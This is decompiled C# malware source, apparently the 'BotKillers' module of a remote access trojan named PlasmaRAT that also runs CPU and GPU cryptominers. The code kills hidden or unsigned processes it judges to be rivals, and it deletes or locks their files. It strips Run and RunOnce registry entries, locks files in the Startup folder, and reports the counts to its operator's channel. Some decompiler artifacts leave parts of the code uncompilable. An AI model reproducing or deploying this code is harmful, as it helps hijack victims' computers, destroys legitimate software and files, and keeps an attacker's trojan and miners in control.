using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System_Configuration.My;

namespace System_Configuration
{
	// Token: 0x02000010 RID: 16
	[StandardModule]
	internal sealed class BotKillers
	{
		// Token: 0x06000051 RID: 81
		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool IsWindowVisible(IntPtr hWnd);

		// Token: 0x06000052 RID: 82
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000053 RID: 83 RVA: 0x00005794 File Offset: 0x00003994
		public static void RunStandardBotKiller()
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				BotKillers.ScanProcess();
				IL_0E:
				num2 = 3;
				BotKillers.RunStartupKiller();
				IL_15:
				num2 = 4;
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"BotKiller: Processes Killed: ",
					BotKillers.ProccessKilled.ToString(),
					". Startup Items Killed: ",
					BotKillers.Startupkilled.ToString(),
					"."
				}), "");
				IL_74:
				num2 = 5;
				BotKillers.ProccessKilled = 0;
				IL_7C:
				num2 = 6;
				BotKillers.Startupkilled = 0;
				IL_84:
				goto IL_EF;
				IL_86:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_B0:
				goto IL_E4;
				IL_B2:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_C2:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_B2;
			}
			IL_E4:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_EF:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000054 RID: 84 RVA: 0x000058A8 File Offset: 0x00003AA8
		public static void ScanProcess()
		{
			try
			{
				Process[] processes = Process.GetProcesses();
				int num = 0;
				int num2 = processes.Length - 1;
				for (int i = num; i <= num2; i++)
				{
					Process process = processes[i];
					try
					{
						string fullPath = Path.GetFullPath(process.MainModule.FileName);
						if (BotKillers.IsFileMalicious(fullPath) && !BotKillers.WindowIsVisible(process.MainWindowTitle))
						{
							try
							{
								process.Kill();
							}
							catch (Exception ex)
							{
							}
							BotKillers.DestroyFile(fullPath);
							BotKillers.ProccessKilled++;
						}
					}
					catch (Exception ex2)
					{
					}
				}
			}
			catch (Exception ex3)
			{
			}
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00005968 File Offset: 0x00003B68
		public static bool IsFileMalicious(string fileloc)
		{
			int num;
			bool flag;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (!fileloc.Contains(Application.ExecutablePath))
				{
					goto IL_1F;
				}
				IL_16:
				num2 = 3;
				flag = false;
				goto IL_21E;
				IL_1F:
				num2 = 5;
				if (!fileloc.Contains(PlasmaRAT.InstallationOfEverything))
				{
					goto IL_37;
				}
				IL_2E:
				num2 = 6;
				flag = false;
				goto IL_21E;
				IL_37:
				num2 = 8;
				if (!fileloc.Contains(Miner.MinerExecutable))
				{
					goto IL_50;
				}
				IL_46:
				num2 = 9;
				flag = false;
				goto IL_21E;
				IL_50:
				num2 = 11;
				if (!fileloc.Contains(GPUMiner.GPUMinerExecutable))
				{
					goto IL_6A;
				}
				IL_60:
				num2 = 12;
				flag = false;
				goto IL_21E;
				IL_6A:
				num2 = 14;
				if (!fileloc.Contains("cmd"))
				{
					goto IL_84;
				}
				IL_7A:
				num2 = 15;
				flag = true;
				goto IL_21E;
				IL_84:
				num2 = 17;
				if (!fileloc.Contains("wscript"))
				{
					goto IL_9E;
				}
				IL_94:
				num2 = 18;
				flag = true;
				goto IL_21E;
				IL_9E:
				num2 = 20;
				if (!fileloc.Contains(RuntimeEnvironment.GetRuntimeDirectory()))
				{
					goto IL_B8;
				}
				IL_AE:
				num2 = 21;
				flag = true;
				goto IL_21E;
				IL_B8:
				num2 = 23;
				if (!BotKillers.WinTrust.VerifyEmbeddedSignature(fileloc))
				{
					goto IL_CD;
				}
				IL_C3:
				num2 = 24;
				flag = false;
				goto IL_21E;
				IL_CD:
				num2 = 26;
				if (!(fileloc.Contains(Environment.GetEnvironmentVariable("USERPROFILE")) | fileloc.Contains(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData))))
				{
					goto IL_FA;
				}
				IL_F0:
				num2 = 27;
				flag = true;
				goto IL_21E;
				IL_FA:
				num2 = 29;
				FileAttributes attributes = File.GetAttributes(fileloc);
				IL_104:
				num2 = 30;
				if ((attributes & FileAttributes.System) != FileAttributes.System)
				{
					goto IL_117;
				}
				IL_10D:
				num2 = 31;
				flag = true;
				goto IL_21E;
				IL_117:
				num2 = 33;
				if ((attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
				{
					goto IL_12A;
				}
				IL_120:
				num2 = 34;
				flag = true;
				goto IL_21E;
				IL_12A:
				num2 = 36;
				flag = false;
				IL_134:
				goto IL_21E;
				IL_139:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_1DD:
				goto IL_213;
				IL_1DF:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_1F0:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_1DF;
			}
			IL_213:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_21E:
			bool result = flag;
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00005BBC File Offset: 0x00003DBC
		public static void KillFile(string location)
		{
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(location);
				DirectorySecurity directorySecurity = new DirectorySecurity();
				directorySecurity.SetAccessRuleProtection(true, false);
				directoryInfo.SetAccessControl(directorySecurity);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x00005C08 File Offset: 0x00003E08
		public static bool WindowIsVisible(string WinTitle)
		{
			bool result;
			try
			{
				IntPtr hWnd = BotKillers.FindWindow(null, WinTitle);
				result = BotKillers.IsWindowVisible(hWnd);
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00005C48 File Offset: 0x00003E48
		public static void RunStartupKiller()
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				BotKillers.StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 1);
				IL_14:
				num2 = 3;
				BotKillers.StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 1);
				IL_21:
				num2 = 4;
				if (!AntiEverything.IsAdmin())
				{
					goto IL_44;
				}
				IL_2A:
				num2 = 5;
				BotKillers.StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 2);
				IL_37:
				num2 = 6;
				BotKillers.StartupFucker("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\", 2);
				IL_44:
				num2 = 8;
				string[] files = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
				IL_52:
				num2 = 9;
				string[] array = files;
				int i = 0;
				while (i < array.Length)
				{
					string location = array[i];
					IL_66:
					num2 = 10;
					BotKillers.KillFile(location);
					i++;
					IL_76:
					num2 = 11;
				}
				IL_80:
				goto IL_106;
				IL_85:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_C5:
				goto IL_FB;
				IL_C7:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_D8:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_C7;
			}
			IL_FB:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_106:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x00005D74 File Offset: 0x00003F74
		public static void StartupFucker(string regkey, int type)
		{
			try
			{
				RegistryKey registryKey;
				if (type == 1)
				{
					registryKey = Registry.CurrentUser.OpenSubKey(regkey);
				}
				if (type == 2)
				{
					registryKey = Registry.LocalMachine.OpenSubKey(regkey);
				}
				foreach (string text in registryKey.GetValueNames())
				{
					try
					{
						string text2 = registryKey.GetValue(text).ToString();
						if (text2.Contains("-"))
						{
							if (text2.Contains("\""))
							{
								text2.Replace("\"", string.Empty);
							}
							try
							{
								string[] array = Strings.Split(text2, " -", -1, CompareMethod.Binary);
								text2 = array[0];
							}
							catch (Exception ex)
							{
							}
						}
						if (text2.Contains("\""))
						{
							string[] array2 = text2.Split(new char[]
							{
								'"'
							});
							text2 = array2[1];
						}
						if (!text2.Contains(Application.ExecutablePath))
						{
							BotKillers.RemoveKey(type, text, regkey, text2);
							if (!BotKillers.WinTrust.VerifyEmbeddedSignature(text2))
							{
								BotKillers.Startupkilled++;
								BotKillers.DestroyFile(text2);
							}
						}
					}
					catch (Exception ex2)
					{
					}
				}
			}
			catch (Exception ex3)
			{
			}
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00005EF8 File Offset: 0x000040F8
		public static void RemoveKey(int Reg, string file, string reglocation, string FileLocation)
		{
			try
			{
				RegistryKey registryKey;
				if (Reg == 1)
				{
					registryKey = Registry.CurrentUser.OpenSubKey(reglocation, true);
				}
				else
				{
					registryKey = Registry.LocalMachine.OpenSubKey(reglocation, true);
				}
				using (registryKey)
				{
					if (registryKey != null)
					{
						registryKey.DeleteValue(file);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600005B RID: 91 RVA: 0x00005F6C File Offset: 0x0000416C
		[MethodImpl(MethodImplOptions.NoOptimization)]
		public static void DestroyFile(string path)
		{
			try
			{
				if (File.Exists(path))
				{
					Random random = new Random();
					try
					{
						MyProject.Computer.FileSystem.MoveFile(path, Path.GetTempPath() + Conversions.ToString(random.Next(500, 9000)));
						File.WriteAllText(path, string.Empty);
						FileSystem.FileOpen(FileSystem.FreeFile(), path, OpenMode.Input, OpenAccess.Default, OpenShare.LockReadWrite, -1);
						BotKillers.KillFile(path);
					}
					catch (Exception ex)
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
						DirectorySecurity directorySecurity = new DirectorySecurity();
						directorySecurity.SetAccessRuleProtection(true, false);
						directoryInfo.SetAccessControl(directorySecurity);
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x0400004E RID: 78
		private static int ProccessKilled = 0;

		// Token: 0x0400004F RID: 79
		private static int Startupkilled = 0;

		// Token: 0x02000048 RID: 72
		public enum WinTrustDataUIChoice : uint
		{
			// Token: 0x0400013F RID: 319
			All = 1u,
			// Token: 0x04000140 RID: 320
			None,
			// Token: 0x04000141 RID: 321
			NoBad,
			// Token: 0x04000142 RID: 322
			NoGood
		}

		// Token: 0x02000049 RID: 73
		public enum WinTrustDataRevocationChecks : uint
		{
			// Token: 0x04000144 RID: 324
			None,
			// Token: 0x04000145 RID: 325
			WholeChain
		}

		// Token: 0x0200004A RID: 74
		public enum WinTrustDataChoice : uint
		{
			// Token: 0x04000147 RID: 327
			File = 1u,
			// Token: 0x04000148 RID: 328
			Catalog,
			// Token: 0x04000149 RID: 329
			Blob,
			// Token: 0x0400014A RID: 330
			Signer,
			// Token: 0x0400014B RID: 331
			Certificate
		}

		// Token: 0x0200004B RID: 75
		public enum WinTrustDataStateAction : uint
		{
			// Token: 0x0400014D RID: 333
			Ignore,
			// Token: 0x0400014E RID: 334
			Verify,
			// Token: 0x0400014F RID: 335
			Close,
			// Token: 0x04000150 RID: 336
			AutoCache,
			// Token: 0x04000151 RID: 337
			AutoCacheFlush
		}

		// Token: 0x0200004C RID: 76
		[Flags]
		public enum WinTrustDataProvFlags : uint
		{
			// Token: 0x04000153 RID: 339
			UseIe4TrustFlag = 1u,
			// Token: 0x04000154 RID: 340
			NoIe4ChainFlag = 2u,
			// Token: 0x04000155 RID: 341
			NoPolicyUsageFlag = 4u,
			// Token: 0x04000156 RID: 342
			RevocationCheckNone = 16u,
			// Token: 0x04000157 RID: 343
			RevocationCheckEndCert = 32u,
			// Token: 0x04000158 RID: 344
			RevocationCheckChain = 64u,
			// Token: 0x04000159 RID: 345
			RevocationCheckChainExcludeRoot = 128u,
			// Token: 0x0400015A RID: 346
			SaferFlag = 256u,
			// Token: 0x0400015B RID: 347
			HashOnlyFlag = 512u,
			// Token: 0x0400015C RID: 348
			UseDefaultOsverCheck = 1024u,
			// Token: 0x0400015D RID: 349
			LifetimeSigningFlag = 2048u,
			// Token: 0x0400015E RID: 350
			CacheOnlyUrlRetrieval = 4096u
		}

		// Token: 0x0200004D RID: 77
		public enum WinTrustDataUIContext : uint
		{
			// Token: 0x04000160 RID: 352
			Execute,
			// Token: 0x04000161 RID: 353
			Install
		}

		// Token: 0x0200004E RID: 78
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public class WinTrustFileInfo
		{
			// Token: 0x0600017F RID: 383 RVA: 0x00002978 File Offset: 0x00000B78
			public WinTrustFileInfo(string _filePath)
			{
				this.StructSize = Marshal.SizeOf(typeof(BotKillers.WinTrustFileInfo));
				this.hFile = IntPtr.Zero;
				this.pgKnownSubject = IntPtr.Zero;
				this.pszFilePath = Marshal.StringToCoTaskMemAuto(_filePath);
			}

			// Token: 0x06000180 RID: 384 RVA: 0x0000F324 File Offset: 0x0000D524
			~WinTrustFileInfo()
			{
				Marshal.FreeCoTaskMem(this.pszFilePath);
			}

			// Token: 0x04000162 RID: 354
			private int StructSize;

			// Token: 0x04000163 RID: 355
			private IntPtr pszFilePath;

			// Token: 0x04000164 RID: 356
			private IntPtr hFile;

			// Token: 0x04000165 RID: 357
			private IntPtr pgKnownSubject;
		}

		// Token: 0x0200004F RID: 79
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public class WinTrustData
		{
			// Token: 0x06000181 RID: 385 RVA: 0x0000F358 File Offset: 0x0000D558
			public WinTrustData(string _fileName)
			{
				this.StructSize = Marshal.SizeOf(typeof(BotKillers.WinTrustData));
				this.PolicyCallbackData = IntPtr.Zero;
				this.SIPClientData = IntPtr.Zero;
				this.UIChoice = BotKillers.WinTrustDataUIChoice.None;
				this.RevocationChecks = BotKillers.WinTrustDataRevocationChecks.None;
				this.UnionChoice = BotKillers.WinTrustDataChoice.File;
				this.StateAction = BotKillers.WinTrustDataStateAction.Ignore;
				this.StateData = IntPtr.Zero;
				this.URLReference = null;
				this.ProvFlags = BotKillers.WinTrustDataProvFlags.SaferFlag;
				this.UIContext = BotKillers.WinTrustDataUIContext.Execute;
				BotKillers.WinTrustFileInfo structure = new BotKillers.WinTrustFileInfo(_fileName);
				this.FileInfoPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(typeof(BotKillers.WinTrustFileInfo)));
				Marshal.StructureToPtr(structure, this.FileInfoPtr, false);
			}

			// Token: 0x06000182 RID: 386 RVA: 0x0000F404 File Offset: 0x0000D604
			~WinTrustData()
			{
				Marshal.FreeCoTaskMem(this.FileInfoPtr);
			}

			// Token: 0x04000166 RID: 358
			private int StructSize;

			// Token: 0x04000167 RID: 359
			private IntPtr PolicyCallbackData;

			// Token: 0x04000168 RID: 360
			private IntPtr SIPClientData;

			// Token: 0x04000169 RID: 361
			private BotKillers.WinTrustDataUIChoice UIChoice;

			// Token: 0x0400016A RID: 362
			private BotKillers.WinTrustDataRevocationChecks RevocationChecks;

			// Token: 0x0400016B RID: 363
			private BotKillers.WinTrustDataChoice UnionChoice;

			// Token: 0x0400016C RID: 364
			private IntPtr FileInfoPtr;

			// Token: 0x0400016D RID: 365
			private BotKillers.WinTrustDataStateAction StateAction;

			// Token: 0x0400016E RID: 366
			private IntPtr StateData;

			// Token: 0x0400016F RID: 367
			private string URLReference;

			// Token: 0x04000170 RID: 368
			private BotKillers.WinTrustDataProvFlags ProvFlags;

			// Token: 0x04000171 RID: 369
			private BotKillers.WinTrustDataUIContext UIContext;
		}

		// Token: 0x02000050 RID: 80
		public enum WinVerifyTrustResult
		{
			// Token: 0x04000173 RID: 371
			Success,
			// Token: 0x04000174 RID: 372
			ProviderUnknown = -2146762751,
			// Token: 0x04000175 RID: 373
			ActionUnknown,
			// Token: 0x04000176 RID: 374
			SubjectFormUnknown,
			// Token: 0x04000177 RID: 375
			SubjectNotTrusted
		}

		// Token: 0x02000051 RID: 81
		public sealed class WinTrust
		{
			// Token: 0x06000184 RID: 388
			[DllImport("wintrust.dll", CharSet = CharSet.Unicode, ExactSpelling = true)]
			private static extern BotKillers.WinVerifyTrustResult WinVerifyTrust([In] IntPtr hwnd, [MarshalAs(UnmanagedType.LPStruct)] [In] Guid pgActionID, [In] BotKillers.WinTrustData pWVTData);

			// Token: 0x06000185 RID: 389 RVA: 0x0000F438 File Offset: 0x0000D638
			public static bool VerifyEmbeddedSignature(string fileName)
			{
				bool result;
				try
				{
					BotKillers.WinTrustData pWVTData = new BotKillers.WinTrustData(fileName);
					Guid pgActionID = new Guid("{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}");
					BotKillers.WinVerifyTrustResult winVerifyTrustResult = BotKillers.WinTrust.WinVerifyTrust(BotKillers.WinTrust.INVALID_HANDLE_VALUE, pgActionID, pWVTData);
					result = (winVerifyTrustResult == BotKillers.WinVerifyTrustResult.Success);
				}
				catch (Exception ex)
				{
					result = false;
				}
				return result;
			}

			// Token: 0x06000186 RID: 390 RVA: 0x0000234B File Offset: 0x0000054B
			private WinTrust()
			{
			}

			// Token: 0x04000178 RID: 376
			private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

			// Token: 0x04000179 RID: 377
			private const string WINTRUST_ACTION_GENERIC_VERIFY_V2 = "{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}";
		}
	}
}
